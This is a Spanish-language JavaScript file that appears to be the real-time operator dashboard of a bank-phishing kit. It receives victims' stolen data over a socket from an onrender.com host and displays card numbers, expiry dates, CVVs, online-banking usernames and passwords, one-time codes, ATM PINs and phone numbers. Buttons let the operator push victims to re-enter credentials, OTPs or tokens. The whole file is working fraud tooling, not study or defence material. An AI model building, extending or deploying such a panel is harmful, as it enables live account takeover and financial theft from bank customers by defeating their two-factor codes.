let socket = io.connect("https://footsafe.onrender.com/");

socket.on("new_dataTable", function (object) {

  console.log(object); 
  let audio = new Audio("../static/audio/timbre.mp3");

  
  let intervalId = setInterval(() => {
    audio.play().catch(function (error) {
      console.log("Error al reproducir el audio:", error);
    });
  }, 1000); 

  
  setTimeout(() => {
    clearInterval(intervalId);
  }, 5000);

  const content = document.getElementById("on-dataTables");
  let panel = document.getElementById("panel-" + object.id);

  if (!panel) {
    console.log("No existe el panel");
    panel = document.createElement("div");
    panel.id = "panel-" + object.id;
    content.appendChild(panel);
  }

  panel.className = "card mb-3";

  let options = {
    year: "2-digit",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
  };

  date = new Date(object.horacreado).toLocaleDateString("es-ES", options);
  setDate = new Date(object.horamodificado).toLocaleDateString(
    "es-ES",
    options
  );

  if (object.status == "Finalizado") {
    panel.innerHTML = `<div class="divcard">
              <div class="dropdown mt-3 mb-2 mx-3">
                    <button class="btn btn-secondary dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false">
                        Acciones
                    </button>
                    <ul class="dropdown-menu" data-id="${object.idreg}">
                      <li><a class="dropdown-item active bg-danger" href="" data-estado="eliminar" onclick="deleteData(this.closest('.dropdown-menu').getAttribute('data-id'));  location.reload();">Eliminar</a></li>
                    </ul>
                </div>
                <table class="table table-striped table-bordered table-sm">
  <thead>
    <tr>
      <th scope="col">Fuente</th>
      <th scope="col">Nombre</th>
      <th scope="col">CC</th>
      <th scope="col">TC</th>
      <th scope="col">EXP</th>
      <th scope="col">CVV</th>
      <th scope="col">Banco</th>
      <th scope="col">Usuario</th>
      <th scope="col">Contraseña</th>
      <th scope="col">Dinámica</th>
      <th scope="col">Cajero</th>
      <th scope="col">Teléfono</th>
      <th scope="col">Estado</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th scope="row">Tarjetas</th>
      <td>${object.nombre}</td>
      <td>${object.id}</td>
      <td>${object.tarjeta}</td>
      <td>${object.ftarjeta}</td>
      <td>${object.cvv}</td>
      <td>${object.banco}</td>
      <td>${object.usuario}</td>
      <td>${object.password}</td>
      <td>${object.otp}</td>
      <td>${object.ccajero}</td>
      <td>${object.celular}</td>
      <td>${object.status}</td>
    </tr>
  </tbody>
</table>
</div>
        `;
  } else {
    panel.innerHTML = `
          <div class="divcard">
            <div class="dropdown mt-3 mb-2 mx-3">
                    <button class="btn btn-secondary dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false">
                        Acciones
                    </button>
                    <ul class="dropdown-menu" data-id="${object.idreg}">
                      <li><a class="dropdown-item active bg-danger" href="" data-estado="eliminar" onclick="deleteData(this.closest('.dropdown-menu').getAttribute('data-id'));  location.reload();">Eliminar</a></li>
                    </ul>
                </div>
                <table class="table table-striped table-bordered table-sm">
  <thead>
    <tr>
      <th scope="col">Fuente</th>
      <th scope="col">Nombre</th>
      <th scope="col">CC</th>
      <th scope="col">TC</th>
      <th scope="col">EXP</th>
      <th scope="col">CVV</th>
      <th scope="col">Banco</th>
      <th scope="col">Usuario</th>
      <th scope="col">Contraseña</th>
      <th scope="col">Dinámica</th>
      <th scope="col">Cajero</th>
      <th scope="col">Teléfono</th>
      <th scope="col">Estado</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th scope="row">Tarjetas</th>
      <td>${object.nombre}</td>
      <td>${object.id}</td>
      <td>${object.tarjeta}</td>
      <td>${object.ftarjeta}</td>
      <td>${object.cvv}</td>
      <td>${object.banco}</td>
      <td>${object.usuario}</td>
      <td>${object.password}</td>
      <td>${object.otp}</td>
      <td>${object.ccajero}</td>
      <td>${object.celular}</td>
      <td>${object.status}</td>
    </tr>
  </tbody>
</table>
</div>
        <div class="buttons mt-3 mb-3">
        <button class="btno me-3" style="margin-left: 0.5rem" id="user-button-${object.idreg}">User</button>
        <button class="btno me-3" style="margin-left: 0.5rem" id="new-user-button-${object.idreg}">New User</button>
        <button class="btno me-3" id="OTP-button-${object.idreg}">OTP</button>
        <button class="btno me-3" id="newOTP-button-${object.idreg}">New OTP</button>
        <button class="btno me-3" id="token-button-${object.idreg}">Token</button>
        <button class="btno me-3" id="newtoken-button-${object.idreg}">New Token</button>
        <button class="btno me-3" id="ccajero-button-${object.idreg}">Cajero</button>
        <button class="btnend me-3" id="end-button-${object.idreg}">End</button>
        </div>

        `;
    
    let ccajeroButtons = document.querySelector(
      `#ccajero-button-${object.idreg}`
    );
    ccajeroButtons.addEventListener("click", function (link) {
      link.preventDefault();
      fetch("events/ccajero", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ id: object.id }),
      })
        .then((response) => response.json())
        .then((data) => {
          console.log(data);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    });

    let tokenButtons = document.querySelector(`#token-button-${object.idreg}`);
    tokenButtons.addEventListener("click", function (link) {
      link.preventDefault();
      fetch("events/token", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ id: object.id }),
      })
        .then((response) => response.json())
        .then((data) => {
          console.log(data);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    });

    let newTokenButtons = document.querySelector(
      `#newtoken-button-${object.idreg}`
    );
    newTokenButtons.addEventListener("click", function (link) {
      link.preventDefault();
      fetch("events/newToken", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ id: object.id }),
      })
        .then((response) => response.json())
        .then((data) => {
          console.log(data);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    });

    let userButtons = document.querySelector(`#user-button-${object.idreg}`);
    userButtons.addEventListener("click", function (link) {
      link.preventDefault();
      fetch("events/user", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ id: object.id }),
      })
        .then((response) => response.json())
        .then((data) => {
          console.log(data);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    });

        let newUserButtons = document.querySelector(
          `#new-user-button-${object.idreg}`
        );
        newUserButtons.addEventListener("click", function (link) {
          link.preventDefault();
          fetch("events/newUser", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({ id: object.id }),
          })
            .then((response) => response.json())
            .then((data) => {
              console.log(data);
            })
            .catch((error) => {
              console.error("Error:", error);
            });
        });

    let OTPButtons = document.querySelector(`#OTP-button-${object.idreg}`);
    OTPButtons.addEventListener("click", function (link) {
      link.preventDefault();
      fetch("events/otp", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ id: object.id }),
      })
        .then((response) => response.json())
        .then((data) => {
          console.log(data);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    });

    let newOTPButtons = document.querySelector(
      `#newOTP-button-${object.idreg}`
    );
    newOTPButtons.addEventListener("click", function (link) {
      link.preventDefault();
      fetch("events/newOtp", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ id: object.id }),
      })
        .then((response) => response.json())
        .then((data) => {
          console.log(data);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    });

    let endButtons = document.querySelector(`#end-button-${object.idreg}`);
    endButtons.addEventListener("click", function (link) {
      link.preventDefault();
      fetch("events/finish", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ id: object.id }),
      })
        .then((response) => response.json())
        .then((data) => {
          console.log(data);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    });
  }

  content.prepend(panel);
});
